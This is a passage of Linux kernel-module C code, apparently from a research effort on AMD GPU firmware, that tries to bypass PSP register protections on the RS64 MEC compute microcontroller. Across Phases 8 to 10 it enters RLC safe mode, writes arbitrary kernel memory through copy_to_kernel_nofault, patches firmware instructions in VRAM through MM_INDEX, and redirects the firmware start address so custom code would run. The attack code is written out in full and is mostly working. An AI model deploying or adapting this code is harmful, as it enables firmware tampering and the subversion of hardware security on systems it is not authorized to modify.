			pr_info("fw36: All ring structs with names:\n");
			for (sd = 0x1000; sd < 0x80000 && found < 20; sd += 8) {
				u64 v = *(u64 *)((u8 *)adev + sd);
				if (v == (u64)adev) {
					u64 f = *(u64 *)((u8 *)adev + sd + 8);
					if ((f >> 48) == 0xFFFF && (f & 0xFFF) == 0) {
						char rn[32];
						if (copy_from_kernel_nofault(rn, (u8 *)adev + sd + 0x280, 16) == 0) {
							rn[16] = 0;
							if (rn[0] >= 'a' && rn[0] <= 'z') {
								pr_info("fw36:   adev+0x%05X: %.16s funcs=0x%llX\n",
									sd, rn, f);
								found++;
							}
						}
					}
				}
			}
		}
	}

	/* ============================================================
	 * PHASE 8: RLC Safe Mode + Direct VRAM Write
	 * Vector A: Enter RLC safe mode, retry IC_BASE MMIO writes
	 * Vector B: Write modified firmware directly to VRAM via MM_INDEX
	 * ============================================================ */
	pr_info("fw36: ========== PHASE 8: RLC SAFE MODE + VRAM WRITE ==========\n");

	/* 8A: RLC Safe Mode entry — may relax PSP register protections */
	{
		/* RLC_SAFE_MODE register at GC base1 offset 0x4C50.
		 * Bit 0 = CMD (1=enter safe mode, 0=exit)
		 * Bit 1 = MESSAGE (driver sets, RLC clears when done)
		 * Also try via driver's own gfx_v12_0_rlc_enter_safe_mode */
		#define regRLC_SAFE_MODE GC0(0x4C50)
		u32 rlc_safe_pre, rlc_safe_post;
		u32 ic_lo_pre, ic_hi_pre, ic_cntl_pre;
		u32 ic_lo_post, ic_hi_post, ic_cntl_post;
		unsigned long rlc_enter, rlc_exit;
		int wait;

		rlc_safe_pre = rr(regRLC_SAFE_MODE);
		pr_info("fw36: RLC_SAFE_MODE pre = 0x%08X\n", rlc_safe_pre);

		ic_lo_pre = rr(regCP_CPC_IC_BASE_LO);
		ic_hi_pre = rr(regCP_CPC_IC_BASE_HI);
		ic_cntl_pre = rr(regCP_CPC_IC_BASE_CNTL);
		pr_info("fw36: IC_BASE pre-safe: LO=0x%08X HI=0x%08X CNTL=0x%08X\n",
			ic_lo_pre, ic_hi_pre, ic_cntl_pre);

		/* Method 1: Direct MMIO write to RLC_SAFE_MODE */
		pr_info("fw36: Entering RLC safe mode via MMIO...\n");
		wr(regRLC_SAFE_MODE, 0x3); /* CMD=1, MESSAGE=1 */
		udelay(1000);

		/* Poll for RLC to acknowledge (bit 1 cleared) */
		for (wait = 0; wait < 100; wait++) {
			rlc_safe_post = rr(regRLC_SAFE_MODE);
			if ((rlc_safe_post & 0x2) == 0) break;
			udelay(100);
		}
		pr_info("fw36: RLC_SAFE_MODE after enter = 0x%08X (waited %d)\n",
			rlc_safe_post, wait);

		/* Now try writing IC_BASE while in safe mode */
		pr_info("fw36: Attempting IC_BASE writes in safe mode...\n");
		wr(regCP_CPC_IC_BASE_LO, 0x12345000);
		udelay(100);
		ic_lo_post = rr(regCP_CPC_IC_BASE_LO);
		wr(regCP_CPC_IC_BASE_LO, ic_lo_pre); /* restore */

		wr(regCP_CPC_IC_BASE_HI, 0x00000099);
		udelay(100);
		ic_hi_post = rr(regCP_CPC_IC_BASE_HI);
		wr(regCP_CPC_IC_BASE_HI, ic_hi_pre); /* restore */

		wr(regCP_CPC_IC_BASE_CNTL, ic_cntl_pre | 0x1);
		udelay(100);
		ic_cntl_post = rr(regCP_CPC_IC_BASE_CNTL);
		wr(regCP_CPC_IC_BASE_CNTL, ic_cntl_pre); /* restore */

		pr_info("fw36: IC_BASE_LO write 0x12345000 → read 0x%08X %s\n",
			ic_lo_post,
			ic_lo_post == 0x12345000 ? "*** WRITABLE IN SAFE MODE! ***" : "still locked");
		pr_info("fw36: IC_BASE_HI write 0x00000099 → read 0x%08X %s\n",
			ic_hi_post,
			ic_hi_post == 0x00000099 ? "*** WRITABLE IN SAFE MODE! ***" : "still locked");
		pr_info("fw36: IC_BASE_CNTL write 0x%08X → read 0x%08X %s\n",
			ic_cntl_pre | 0x1, ic_cntl_post,
			ic_cntl_post != ic_cntl_pre ? "*** CHANGED! ***" : "still locked");

		/* Exit safe mode */
		wr(regRLC_SAFE_MODE, 0x1); /* CMD=1, MESSAGE=0 → exit */
		udelay(1000);
		pr_info("fw36: RLC_SAFE_MODE after exit = 0x%08X\n", rr(regRLC_SAFE_MODE));

		/* Method 2: Try via driver function if it exists */
		rlc_enter = klookup("gfx_v12_0_rlc_enter_safe_mode");
		rlc_exit = klookup("gfx_v12_0_rlc_exit_safe_mode");
		pr_info("fw36: gfx_v12_0_rlc_enter_safe_mode = 0x%lX\n", rlc_enter);
		pr_info("fw36: gfx_v12_0_rlc_exit_safe_mode = 0x%lX\n", rlc_exit);

		if (rlc_enter && rlc_exit) {
			typedef void (*fn_rlc_safe)(void *adev);
			fn_rlc_safe p_enter = (fn_rlc_safe)rlc_enter;
			fn_rlc_safe p_exit = (fn_rlc_safe)rlc_exit;

			pr_info("fw36: Calling driver rlc_enter_safe_mode...\n");
			p_enter(adev);
			udelay(2000);

			pr_info("fw36: RLC_SAFE_MODE = 0x%08X after driver enter\n",
				rr(regRLC_SAFE_MODE));

			/* Retry IC_BASE writes */
			wr(regCP_CPC_IC_BASE_LO, 0xABCD0000);
			udelay(100);
			ic_lo_post = rr(regCP_CPC_IC_BASE_LO);
			wr(regCP_CPC_IC_BASE_LO, ic_lo_pre); /* restore */

			/* Also try MEC_CNTL — halt MEC */
			{
				u32 mec_cntl_pre = rr(regCP_MEC_CNTL);
				wr(regCP_MEC_CNTL, mec_cntl_pre | (1 << 30)); /* HALT */
				udelay(100);
				pr_info("fw36: MEC_CNTL write HALT: pre=0x%08X post=0x%08X %s\n",
					mec_cntl_pre, rr(regCP_MEC_CNTL),
					(rr(regCP_MEC_CNTL) & (1 << 30)) ? "*** HALTED ***" : "no effect");
				wr(regCP_MEC_CNTL, mec_cntl_pre); /* restore */
			}

			/* Try RS64 CNTL halt */
			{
				u32 rs64_pre = rr(regCP_MEC_RS64_CNTL);
				wr(regCP_MEC_RS64_CNTL, rs64_pre | (1 << 30)); /* MEC_HALT */
				udelay(100);
				pr_info("fw36: RS64_CNTL write HALT: pre=0x%08X post=0x%08X %s\n",
					rs64_pre, rr(regCP_MEC_RS64_CNTL),
					(rr(regCP_MEC_RS64_CNTL) & (1 << 30)) ? "*** HALTED ***" : "no effect");
				wr(regCP_MEC_RS64_CNTL, rs64_pre); /* restore */
			}

			pr_info("fw36: IC_BASE_LO write 0xABCD0000 → read 0x%08X %s\n",
				ic_lo_post,
				ic_lo_post == 0xABCD0000 ? "*** WRITABLE VIA DRIVER! ***" : "still locked");

			pr_info("fw36: Calling driver rlc_exit_safe_mode...\n");
			p_exit(adev);
			udelay(1000);
			pr_info("fw36: RLC_SAFE_MODE after driver exit = 0x%08X\n",
				rr(regRLC_SAFE_MODE));
		}
		#undef regRLC_SAFE_MODE
	}

	/* 8B: Direct VRAM write via MM_INDEX/MM_DATA */
	{
		u64 ic_base_full;
		u64 fb_base_val;
		u64 vram_offset;
		u32 fw_orig[8], fw_check[8];
		int i;
		u32 pc_before, pc_after;

		ic_base_full = ((u64)rr(regCP_CPC_IC_BASE_HI) << 32) |
			       rr(regCP_CPC_IC_BASE_LO);
		fb_base_val = (u64)rr(GC0(0x1614)) << 24;

		pr_info("fw36: === 8B: DIRECT VRAM WRITE VIA MM_INDEX ===\n");
		pr_info("fw36: IC_BASE = 0x%016llX, FB_BASE = 0x%llX\n",
			ic_base_full, fb_base_val);

		/* IC_BASE is a GPU virtual address (0x20681D4000).
		 * We need the VRAM physical offset.
		 * IC_BASE_LO = 0x681D4000, IC_BASE_HI = 0x00000020
		 * This is in GPU VA space, not directly accessible via MM_INDEX.
		 *
		 * Approach: Try multiple interpretations:
		 * 1) IC_BASE_LO as raw VRAM offset (0x681D4000 = ~1.63GB)
		 * 2) IC_BASE - FB_BASE
		 * 3) Search VRAM for MEC firmware signature */

		/* Try IC_BASE_LO as VRAM offset (0x681D4000) */
		vram_offset = rr(regCP_CPC_IC_BASE_LO);
		pr_info("fw36: Testing VRAM offset = 0x%llX (IC_BASE_LO)...\n", vram_offset);

		for (i = 0; i < 8; i++)
			fw_orig[i] = vram_read32(vram_offset + i * 4);

		pr_info("fw36: VRAM[0x%llX]: %08X %08X %08X %08X\n",
			vram_offset, fw_orig[0], fw_orig[1], fw_orig[2], fw_orig[3]);
		pr_info("fw36: VRAM[0x%llX]: %08X %08X %08X %08X\n",
			vram_offset + 16, fw_orig[4], fw_orig[5], fw_orig[6], fw_orig[7]);

		if (fw_orig[0] != 0 || fw_orig[1] != 0) {
			pr_info("fw36: *** NON-ZERO DATA at IC_BASE_LO offset! ***\n");
			pr_info("fw36: Attempting canary write at +28...\n");

			/* Write a canary to last dword of our 8-dword window.
			 * Save original, write 0xDEAD1337, read back, restore. */
			pc_before = rr(regCP_MEC1_INSTR_PNTR);

			vram_write32(vram_offset + 28, 0xDEAD1337);
			udelay(100);
			fw_check[7] = vram_read32(vram_offset + 28);
			pr_info("fw36: Canary write: wrote 0xDEAD1337, read 0x%08X %s\n",
				fw_check[7],
				fw_check[7] == 0xDEAD1337 ? "*** VRAM IS WRITABLE! ***" : "no effect");

			/* Restore original value */
			vram_write32(vram_offset + 28, fw_orig[7]);
			udelay(100);

			pc_after = rr(regCP_MEC1_INSTR_PNTR);
			pr_info("fw36: PC before=0x%04X after=0x%04X %s\n",
				pc_before, pc_after,
				pc_before != pc_after ? "*** PC CHANGED! ***" : "stable");

			/* If canary worked, try writing a NOP sled at firmware start.
			 * RS64 NOP = 0x00000013 (RISC-V ADDI x0,x0,0) */
			if (fw_check[7] == 0xDEAD1337) {
				pr_info("fw36: *** VRAM WRITE CONFIRMED! ***\n");
				pr_info("fw36: Attempting IC_INVALIDATE to force firmware reload...\n");

				/* Invalidate instruction cache — forces MEC to re-fetch from VRAM */
				{
					u32 rs64_cntl = rr(regCP_MEC_RS64_CNTL);
					wr(regCP_MEC_RS64_CNTL, rs64_cntl | (1 << 4)); /* INVALIDATE_ICACHE */
					udelay(500);
					pr_info("fw36: RS64_CNTL after IC invalidate = 0x%08X\n",
						rr(regCP_MEC_RS64_CNTL));

					/* Check if MEC re-reads VRAM (PC should reset or change) */
					pc_after = rr(regCP_MEC1_INSTR_PNTR);
					pr_info("fw36: PC after IC invalidate = 0x%04X\n", pc_after);

					/* Restore RS64_CNTL */
					wr(regCP_MEC_RS64_CNTL, rs64_cntl);
				}
			}
		} else {
			pr_info("fw36: All zeros at IC_BASE_LO offset — wrong address mapping\n");

			/* Try IC_BASE - FB_BASE */
			if (ic_base_full > fb_base_val) {
				vram_offset = ic_base_full - fb_base_val;
				if (vram_offset < 0x400000000ULL) {
					pr_info("fw36: Trying VRAM offset = 0x%llX (IC_BASE - FB_BASE)...\n",
						vram_offset);
					for (i = 0; i < 8; i++)
						fw_orig[i] = vram_read32(vram_offset + i * 4);
					pr_info("fw36: VRAM[0x%llX]: %08X %08X %08X %08X\n",
						vram_offset, fw_orig[0], fw_orig[1], fw_orig[2], fw_orig[3]);
					if (fw_orig[0] != 0 || fw_orig[1] != 0)
						pr_info("fw36: *** NON-ZERO DATA at IC-FB offset! ***\n");
				}
			}

			/* Brute-force: search VRAM for RS64 firmware header.
			 * MEC firmware typically starts with known RISC-V instructions.
			 * The firmware blob we loaded has magic at offset 0: look for AUIPC
			 * (opcode 0x17) or LUI (opcode 0x37) patterns typical of RISC-V reset vector */
			pr_info("fw36: Scanning VRAM for RS64 firmware pattern...\n");
			{
				u64 scan;
				int found = 0;
				/* Scan in 4KB steps from 0x60000000 to 0x70000000 */
				for (scan = 0x60000000ULL; scan < 0x70000000ULL && found < 5; scan += 0x1000) {
					u32 d0 = vram_read32(scan);
					u32 d1 = vram_read32(scan + 4);
					/* Check for RISC-V boot pattern: auipc or lui at word 0 */
					if ((d0 & 0x7F) == 0x17 || (d0 & 0x7F) == 0x37 ||
					    d0 == 0x00000297) { /* auipc t0, 0 — common reset vector */
						u32 d2 = vram_read32(scan + 8);
						u32 d3 = vram_read32(scan + 12);
						pr_info("fw36: RS64 candidate at VRAM 0x%llX: %08X %08X %08X %08X\n",
							scan, d0, d1, d2, d3);
						found++;
					}
				}
				if (!found)
					pr_info("fw36: No RS64 firmware pattern found in 0x60000000-0x70000000\n");
			}
		}
	}

	/* 8C: Try GART/GTT mapping approach — find mec_fw BO kernel pointer */
	{
		/* The driver stores firmware BOs in adev->gfx.mec.mec_fw_obj/data_obj.
		 * These BOs have kernel-mapped (kptr) addresses we can write to directly.
		 * The GPU will read from the same backing memory via MC address.
		 * This bypasses both PSP register locks AND VRAM address translation. */
		unsigned long sym;
		pr_info("fw36: === 8C: FIRMWARE BO KPTR HUNT ===\n");

		/* Search for amdgpu_bo structures near the MEC context.
		 * adev->gfx is at a large offset. Try scanning for BO patterns:
		 * BO has: .tbo.base.resv(kptr), .tbo.mem.placement(int), .kptr(kptr to VRAM data) */

		/* Look for mec_fw_data_obj — the firmware data BO.
		 * In amdgpu, this is adev->gfx.mec.mec_fw_data_obj (amdgpu_bo ptr)
		 * and the mc_addr is adev->gfx.mec.mec_fw_data_mc_addr.
		 * The kptr can be obtained via amdgpu_bo_kmap if mapped. */
		sym = klookup("amdgpu_bo_kmap");
		pr_info("fw36: amdgpu_bo_kmap = 0x%lX\n", sym);

		/* Scan adev for fw data BO pattern:
		 * We know IC_BASE points to firmware code. The mc_addr for the firmware
		 * BO should match IC_BASE or be very close. Search for mc_addr values. */
		{
			int off;
			u64 ic_lo = rr(regCP_CPC_IC_BASE_LO);
			u64 ic_hi = rr(regCP_CPC_IC_BASE_HI);
			u64 ic_full = (ic_hi << 32) | ic_lo;

			pr_info("fw36: Searching adev for mc_addr matching IC_BASE...\n");
			for (off = 0x10000; off < 0x80000; off += 8) {
				u64 mc = *(u64 *)((u8 *)adev + off);
				/* Match mc_addr to IC_BASE (may differ in high bits) */
				if ((mc & 0xFFFFFF000ULL) == (ic_full & 0xFFFFFF000ULL) && mc != 0) {
					u64 prev = *(u64 *)((u8 *)adev + off - 8);
					u64 next = *(u64 *)((u8 *)adev + off + 8);
					pr_info("fw36: mc_addr match at adev+0x%X: 0x%llX\n", off, mc);
					pr_info("fw36:   prev=0x%llX next=0x%llX\n", prev, next);

					/* prev might be the BO pointer, next might be gpu_addr or size */
					if ((prev >> 48) == 0xFFFF) {
						/* prev is a kptr — might be the BO itself */
						u64 kptr_candidate = 0;
						int koff;
						pr_info("fw36:   BO candidate at 0x%llX\n", prev);

						/* Try to find kptr inside BO struct.
						 * amdgpu_bo->kptr is typically at offset ~0x108 or ~0x120
						 * depending on kernel version */
						for (koff = 0x80; koff < 0x180; koff += 8) {
							u64 kv;
							if (copy_from_kernel_nofault(&kv,
								(void *)((unsigned long)prev + koff), 8) == 0) {
								if ((kv >> 48) == 0xFFFF && kv != prev &&
								    kv != 0xFFFFFFFFFFFFFFFFULL) {
									u32 test[4];
									if (copy_from_kernel_nofault(test,
										(void *)(unsigned long)kv, 16) == 0) {
										if (test[0] != 0 || test[1] != 0) {
											pr_info("fw36:   BO+0x%X kptr=0x%llX: "
												"%08X %08X %08X %08X\n",
												koff, kv,
												test[0], test[1], test[2], test[3]);
											if (!kptr_candidate)
												kptr_candidate = kv;
										}
									}
								}
							}
						}

						/* If we found a kptr with data, try writing to it! */
						if (kptr_candidate) {
							u32 orig_val, canary;
							pr_info("fw36: *** TESTING WRITE via kptr 0x%llX ***\n",
								kptr_candidate);

							if (copy_from_kernel_nofault(&orig_val,
								(void *)(unsigned long)(kptr_candidate + 28), 4) == 0) {
								canary = 0xDEAD1337;
								pr_info("fw36: Original [+28] = 0x%08X\n", orig_val);

								/* Write canary */
								if (copy_to_kernel_nofault(
									(void *)(unsigned long)(kptr_candidate + 28),
									&canary, 4) == 0) {
									u32 readback;
									copy_from_kernel_nofault(&readback,
										(void *)(unsigned long)(kptr_candidate + 28), 4);
									pr_info("fw36: Canary write: 0x%08X %s\n",
										readback,
										readback == 0xDEAD1337 ?
										"*** KPTR WRITE SUCCESS! ***" : "failed");

									/* Restore */
									copy_to_kernel_nofault(
										(void *)(unsigned long)(kptr_candidate + 28),
										&orig_val, 4);
								} else {
									pr_info("fw36: copy_to_kernel_nofault failed\n");
								}
							}
						}
					}
				}
			}
		}
	}

	/* ============================================================
	 * PHASE 9: EXPLOIT WRITABLE VRAM — FIRMWARE HOT-PATCH
	 * VRAM at IC_BASE_LO offset is confirmed writable via MM_INDEX.
	 * Now we need to make MEC re-fetch from modified VRAM.
	 * ============================================================ */
	pr_info("fw36: ========== PHASE 9: VRAM FIRMWARE HOT-PATCH ==========\n");
	{
		u64 fw_vram_base = (u64)rr(regCP_CPC_IC_BASE_LO);
		u32 pc_val = rr(regCP_MEC1_INSTR_PNTR);
		u32 fw_dump[32];
		u32 rs64_cntl, mec_cntl;
		int i;
		u32 pc_check;

		/* Dump firmware around current PC.
		 * PC is in instruction units. RS64 instructions are 4 bytes.
		 * VRAM offset of current PC = fw_vram_base + PC * 4 */
		u64 pc_vram = fw_vram_base + (u64)pc_val * 4;

		pr_info("fw36: FW VRAM base = 0x%llX, PC = 0x%04X, PC VRAM = 0x%llX\n",
			fw_vram_base, pc_val, pc_vram);

		/* Dump 128 bytes (32 instructions) starting at PC */
		pr_info("fw36: Firmware dump at PC:\n");
		for (i = 0; i < 32; i++)
			fw_dump[i] = vram_read32(pc_vram + i * 4);
		for (i = 0; i < 32; i += 4)
			pr_info("fw36:   [PC+%02d] %08X %08X %08X %08X\n",
				i, fw_dump[i], fw_dump[i+1], fw_dump[i+2], fw_dump[i+3]);

		/* Also dump firmware start (PC=0) */
		pr_info("fw36: Firmware dump at start (PC=0):\n");
		for (i = 0; i < 16; i++)
			fw_dump[i] = vram_read32(fw_vram_base + i * 4);
		for (i = 0; i < 16; i += 4)
			pr_info("fw36:   [PC=%02d] %08X %08X %08X %08X\n",
				i, fw_dump[i], fw_dump[i+1], fw_dump[i+2], fw_dump[i+3]);

		/* === APPROACH 1: Write GP scratch reg via firmware modification ===
		 * We'll modify the instruction at PC to write a signature to GP scratch.
		 *
		 * RS64 is RISC-V RV32I. To write to a GPU register, MEC firmware uses
		 * MMIO-mapped CSR or custom instructions. We don't know the exact
		 * encoding for GPU register writes.
		 *
		 * Simpler: Just change one instruction to a different value and see
		 * if MEC behavior changes (PC should change, or crash to 0). */

		/* === APPROACH 2: Halt MEC, modify VRAM, invalidate IC, unhalt ===  */
		pr_info("fw36: --- Halt-Modify-Invalidate-Unhalt sequence ---\n");

		/* Save original instruction at PC */
		{
			u32 orig_instr = vram_read32(pc_vram);
			u32 orig_instr_next = vram_read32(pc_vram + 4);

			/* RS64 RISC-V NOP = 0x00000013 (addi x0, x0, 0)
			 * RS64 RISC-V JAL x0, 0 (jump to self, infinite loop) = 0x0000006F */
			u32 nop_instr = 0x00000013;
			u32 jal_self = 0x0000006F;

			pr_info("fw36: Original instruction at PC: 0x%08X\n", orig_instr);
			pr_info("fw36: Next instruction: 0x%08X\n", orig_instr_next);

			/* Step 1: Read RS64_CNTL and MEC_CNTL */
			rs64_cntl = rr(regCP_MEC_RS64_CNTL);
			mec_cntl = rr(regCP_MEC_CNTL);
			pr_info("fw36: RS64_CNTL = 0x%08X, MEC_CNTL = 0x%08X\n",
				rs64_cntl, mec_cntl);

			/* Step 2: Try halt via RS64_CNTL bit 30 */
			pr_info("fw36: Attempting MEC halt via RS64_CNTL...\n");
			wr(regCP_MEC_RS64_CNTL, rs64_cntl | (1 << 30));
			udelay(500);
			pr_info("fw36: RS64_CNTL after halt = 0x%08X\n", rr(regCP_MEC_RS64_CNTL));
			pr_info("fw36: PC after halt attempt = 0x%04X\n", rr(regCP_MEC1_INSTR_PNTR));

			/* Step 3: Also try halt via MEC_CNTL */
			wr(regCP_MEC_CNTL, mec_cntl | (1 << 30));
			udelay(500);
			pr_info("fw36: MEC_CNTL after halt = 0x%08X\n", rr(regCP_MEC_CNTL));
			pr_info("fw36: PC after MEC halt = 0x%04X\n", rr(regCP_MEC1_INSTR_PNTR));

			/* Step 4: Write JAL-to-self at PC location (creates infinite loop) */
			pr_info("fw36: Writing JAL-to-self (0x%08X) at VRAM 0x%llX...\n",
				jal_self, pc_vram);
			vram_write32(pc_vram, jal_self);
			udelay(100);

			/* Verify write */
			{
				u32 readback = vram_read32(pc_vram);
				pr_info("fw36: Readback: 0x%08X %s\n", readback,
					readback == jal_self ? "WRITE OK" : "WRITE FAILED");
			}

			/* Step 5: Invalidate IC via RS64_CNTL bit 4 */
			pr_info("fw36: Invalidating instruction cache...\n");
			wr(regCP_MEC_RS64_CNTL, rr(regCP_MEC_RS64_CNTL) | (1 << 4));
			udelay(1000);

			/* Step 6: Also try IC_OP_CNTL for invalidation.
			 * CP_CPC_IC_OP_CNTL: bit 0 = INVALIDATE_CACHE, bit 1 = PRIME_ICACHE */
			pr_info("fw36: IC_OP_CNTL before = 0x%08X\n", rr(regCP_CPC_IC_OP_CNTL));
			wr(regCP_CPC_IC_OP_CNTL, 0x1); /* INVALIDATE_CACHE */
			udelay(1000);
			pr_info("fw36: IC_OP_CNTL after invalidate = 0x%08X\n",
				rr(regCP_CPC_IC_OP_CNTL));

			/* Step 7: Try to prime IC (force re-fetch from VRAM) */
			wr(regCP_CPC_IC_OP_CNTL, 0x2); /* PRIME_ICACHE */
			udelay(1000);
			pr_info("fw36: IC_OP_CNTL after prime = 0x%08X\n",
				rr(regCP_CPC_IC_OP_CNTL));

			/* Step 8: Unhalt MEC — if IC was invalidated and re-primed,
			 * it should now execute our modified firmware */
			pr_info("fw36: Unhalting MEC...\n");
			wr(regCP_MEC_RS64_CNTL, rs64_cntl);  /* restore original */
			wr(regCP_MEC_CNTL, mec_cntl);          /* restore original */
			udelay(2000);

			pc_check = rr(regCP_MEC1_INSTR_PNTR);
			pr_info("fw36: PC after unhalt = 0x%04X (was 0x%04X)\n",
				pc_check, pc_val);

			if (pc_check != pc_val) {
				pr_info("fw36: *** PC CHANGED! FIRMWARE MODIFICATION EFFECTIVE! ***\n");

				/* If PC is stuck at our JAL-to-self location, it worked */
				if (pc_check == pc_val || pc_check == 0) {
					pr_info("fw36: PC at expected location - hot-patch works!\n");
				}
			} else {
				pr_info("fw36: PC unchanged — IC may be independent of VRAM\n");
				pr_info("fw36: The IC may have its own SRAM copy, not backed by VRAM\n");
			}

			/* Step 9: Restore original instruction regardless */
			pr_info("fw36: Restoring original firmware instruction...\n");
			vram_write32(pc_vram, orig_instr);
			udelay(100);
			{
				u32 rb = vram_read32(pc_vram);
				pr_info("fw36: Restore verify: 0x%08X %s\n", rb,
					rb == orig_instr ? "OK" : "MISMATCH");
			}

			/* Step 10: Try pipe reset cycle */
			pr_info("fw36: --- Pipe reset cycle ---\n");
			{
				u32 rs64_v = rr(regCP_MEC_RS64_CNTL);
				/* Set PIPE0_RESET */
				wr(regCP_MEC_RS64_CNTL, rs64_v | (1 << 16));
				udelay(1000);
				pr_info("fw36: After pipe0 reset set: RS64=0x%08X PC=0x%04X\n",
					rr(regCP_MEC_RS64_CNTL), rr(regCP_MEC1_INSTR_PNTR));

				/* Clear reset */
				wr(regCP_MEC_RS64_CNTL, rs64_v);
				udelay(2000);
				pc_check = rr(regCP_MEC1_INSTR_PNTR);
				pr_info("fw36: After pipe0 reset clear: RS64=0x%08X PC=0x%04X\n",
					rr(regCP_MEC_RS64_CNTL), pc_check);

				if (pc_check == 0 || pc_check != pc_val)
					pr_info("fw36: *** PC CHANGED AFTER PIPE RESET! ***\n");
			}

			/* Step 11: Try writing to PRGRM_CNTR_START to redirect reset vector */
			pr_info("fw36: --- Program counter start redirect ---\n");
			{
				u32 pcs_lo = rr(regCP_MEC_RS64_PRGRM_CNTR_START);
				u32 pcs_hi = rr(regCP_MEC_RS64_PRGRM_CNTR_START_HI);
				pr_info("fw36: PRGRM_CNTR_START: LO=0x%08X HI=0x%08X\n",
					pcs_lo, pcs_hi);

				/* Try writing a different start address */
				wr(regCP_MEC_RS64_PRGRM_CNTR_START, 0x1000);
				udelay(100);
				pr_info("fw36: After write 0x1000: START=0x%08X %s\n",
					rr(regCP_MEC_RS64_PRGRM_CNTR_START),
					rr(regCP_MEC_RS64_PRGRM_CNTR_START) == 0x1000 ?
					"*** WRITABLE! ***" : "locked");

				/* Restore */
				wr(regCP_MEC_RS64_PRGRM_CNTR_START, pcs_lo);
			}

			/* Step 12: Check if what we're reading from VRAM is actually the
			 * firmware or just VRAM garbage. Write a known pattern, read back
			 * at multiple offsets to verify coherence */
			pr_info("fw36: --- VRAM coherence check ---\n");
			{
				u32 pattern = 0xCAFEBABE;
				u32 check1, check2;
				u64 test_addr = fw_vram_base + 0x2000; /* offset into FW area */

				u32 save = vram_read32(test_addr);
				vram_write32(test_addr, pattern);
				udelay(10);
				check1 = vram_read32(test_addr);
				/* Read again to verify it's not a read-back register */
				udelay(100);
				check2 = vram_read32(test_addr);

				pr_info("fw36: VRAM[0x%llX]: wrote 0x%08X, read1=0x%08X read2=0x%08X %s\n",
					test_addr, pattern, check1, check2,
					(check1 == pattern && check2 == pattern) ?
					"PERSISTENT" : "VOLATILE");

				vram_write32(test_addr, save); /* restore */
			}

			/* Final PC state */
			pr_info("fw36: Final PC = 0x%04X, RS64_CNTL = 0x%08X\n",
				rr(regCP_MEC1_INSTR_PNTR), rr(regCP_MEC_RS64_CNTL));
		}
	}

	/* ============================================================
	 * PHASE 10: PRGRM_CNTR_START REDIRECT + MEC HALT/RESTART
	 *
	 * PRGRM_CNTR_START is WRITABLE (confirmed in Phase 9).
	 * Plan:
	 * 1) Halt MEC via RS64_CNTL and MEC_CNTL
	 * 2) Write custom firmware to VRAM at a known location
	 * 3) Redirect PRGRM_CNTR_START to that location
	 * 4) Try pipe reset to force MEC to re-read from new start address
	 * 5) Check if PC moves to new location
	 *
	 * Also: try reading MEC SRAM via DM_INDEX to find decrypted firmware
	 * ============================================================ */
	pr_info("fw36: ========== PHASE 10: PRGRM_CNTR_START REDIRECT ==========\n");
	{
		u32 rs64_save, mec_cntl_save;
		u32 pcs_lo_save, pcs_hi_save;
		u32 pc_check;

		rs64_save = rr(regCP_MEC_RS64_CNTL);
		mec_cntl_save = rr(regCP_MEC_CNTL);
		pcs_lo_save = rr(regCP_MEC_RS64_PRGRM_CNTR_START);
		pcs_hi_save = rr(regCP_MEC_RS64_PRGRM_CNTR_START_HI);

		pr_info("fw36: Saved: RS64=0x%08X MEC=0x%08X PCS=0x%08X:%08X PC=0x%04X\n",
			rs64_save, mec_cntl_save, pcs_hi_save, pcs_lo_save,
			rr(regCP_MEC1_INSTR_PNTR));

		/* 10A: Read MEC data memory (SRAM) via DM_INDEX to find decrypted FW.
		 * DM_INDEX_ADDR / DM_INDEX_DATA give indexed access to MEC data SRAM.
		 * This is where the running firmware's data segment lives. */
		pr_info("fw36: --- 10A: MEC Data Memory (SRAM) dump ---\n");
		{
			int dm;
			pr_info("fw36: DM_INDEX SRAM first 64 dwords:\n");
			for (dm = 0; dm < 64; dm += 4) {
				u32 d[4];
				int j;
				for (j = 0; j < 4; j++) {
					wr(regCP_MEC_DM_INDEX_ADDR, dm + j);
					udelay(10);
					d[j] = rr(regCP_MEC_DM_INDEX_DATA);
				}
				if (d[0] != 0 || d[1] != 0 || d[2] != 0 || d[3] != 0)
					pr_info("fw36:   [%3d] %08X %08X %08X %08X\n",
						dm, d[0], d[1], d[2], d[3]);
			}
		}

		/* 10B: Try reading instruction memory via ucode addr/data.
		 * ME1_UCODE_ADDR/DATA was for old-style MEC. RS64 might not use it.
		 * But let's try — if it works, we can read AND WRITE the SRAM. */
		pr_info("fw36: --- 10B: MEC Instruction SRAM probe ---\n");
		{
			int im;
			pr_info("fw36: UCODE SRAM at PC region:\n");
			for (im = 0; im < 16; im++) {
				u32 inst;
				wr(regCP_MEC_ME1_UCODE_ADDR, pc_orig + im);
				udelay(10);
				inst = rr(regCP_MEC_ME1_UCODE_DATA);
				pr_info("fw36:   SRAM[0x%04X] = 0x%08X\n", pc_orig + im, inst);
			}

			/* Also dump from address 0 */
			pr_info("fw36: UCODE SRAM at start:\n");
			for (im = 0; im < 16; im++) {
				u32 inst;
				wr(regCP_MEC_ME1_UCODE_ADDR, im);
				udelay(10);
				inst = rr(regCP_MEC_ME1_UCODE_DATA);
				pr_info("fw36:   SRAM[0x%04X] = 0x%08X\n", im, inst);
			}

			/* Try writing to SRAM! */
			pr_info("fw36: Attempting SRAM write test:\n");
			{
				u32 test_addr_val = 0x1000;  /* safe offset */
				u32 orig_val, new_val;

				wr(regCP_MEC_ME1_UCODE_ADDR, test_addr_val);
				udelay(10);
				orig_val = rr(regCP_MEC_ME1_UCODE_DATA);

				wr(regCP_MEC_ME1_UCODE_ADDR, test_addr_val);
				wr(regCP_MEC_ME1_UCODE_DATA, 0xDEADBEEF);
				udelay(10);

				wr(regCP_MEC_ME1_UCODE_ADDR, test_addr_val);
				udelay(10);
				new_val = rr(regCP_MEC_ME1_UCODE_DATA);

				pr_info("fw36: SRAM[0x%X]: orig=0x%08X wrote=0xDEADBEEF read=0x%08X %s\n",
					test_addr_val, orig_val, new_val,
					new_val == 0xDEADBEEF ? "*** SRAM WRITABLE! ***" :
					(new_val != orig_val ? "CHANGED (unexpected)" : "locked"));

				/* Restore if it changed */
				if (new_val == 0xDEADBEEF) {
					wr(regCP_MEC_ME1_UCODE_ADDR, test_addr_val);
					wr(regCP_MEC_ME1_UCODE_DATA, orig_val);
				}
			}
		}

		/* 10C: Full halt → redirect PRGRM_CNTR_START → pipe reset → check PC */
		pr_info("fw36: --- 10C: Halt + Redirect + Reset ---\n");

		/* Step 1: Halt MEC */
		wr(regCP_MEC_RS64_CNTL, rs64_save | (1 << 30));
		wr(regCP_MEC_CNTL, mec_cntl_save | (1 << 30));
		udelay(1000);
